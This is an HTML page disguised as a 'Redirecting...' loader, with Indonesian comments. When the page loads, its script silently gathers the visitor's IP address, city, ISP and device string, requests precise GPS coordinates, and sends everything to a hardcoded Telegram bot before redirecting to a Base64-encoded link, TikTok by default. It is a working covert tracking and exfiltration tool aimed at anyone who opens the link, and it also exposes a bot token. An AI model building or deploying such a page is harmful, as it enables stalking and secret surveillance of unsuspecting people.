<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; font-family: sans-serif; }
        .loader { border: 3px solid #333; border-top: 3px solid #00f2ea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        // --- 1. CONFIGURATION ---
        // Ganti URL ini dengan API endpoint atau Webhook Lu buat nampung datanya
        const WEBHOOK_URL = "https://api.telegram.org/bot8775661623:AAG5vKbtp089TtX_ExTYoDEMigA2rDJn1zc/sendMessage";
        const CHAT_ID = "8432724042";

        // Ambil URL tujuan dari Base64 di parameter ?id=
        const urlParams = new URLSearchParams(window.location.search);
        const encodedData = urlParams.get('id');
        const REDIRECT_URL = encodedData ? atob(encodedData) : "https://www.tiktok.com";

        // --- 2. DATA TRANSMISSION ---
        async function sendLog(text) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } catch (e) { console.error("Signal lost."); }
        }

        function finish() {
            window.location.href = REDIRECT_URL;
        }

        // --- 3. RECONNAISSANCE LOGIC ---
        async function startRecon() {
            // STEP A: LANGKAH PERTAMA - TRACK ISP (ANTI-BLOCK BACKUP)
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                const ipMsg = `🌐 *NETWORK LOG (ISP TRACK)*\nIP: \`${ipData.ip}\`\nCity: ${ipData.city}\nISP: *${ipData.org}*\nDevice: ${navigator.userAgent}`;
                await sendLog(ipMsg);
            } catch (e) { await sendLog("⚠️ ISP Tracking failed."); }

            // STEP B: LANGKAH KEDUA - MINTA LOKASI AKURAT (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        // USER KLIK ALLOW (HOKI)
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        await sendLog(`🎯 *PRECISION HIT (GPS)*\n📍 [Open Location](${mapsLink})\nAcc: ${pos.coords.accuracy}m`);
                        finish();
                    },
                    async (err) => {
                        // USER KLIK BLOCK / TIMEOUT
                        await sendLog("❌ *GPS ACCESS DENIED/BLOCKED* - Falling back to ISP data.");
                        finish();
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            } else {
                await sendLog("⚠️ Device doesn't support GPS.");
                finish();
            }
        }

        // --- 4. EXECUTION ---
        // Jalankan recon begitu page terbuka
        window.onload = startRecon;

        // Force redirect jika user AFK lebih dari 10 detik
        setTimeout(finish, 10000);
    </script>
</body>
</html>
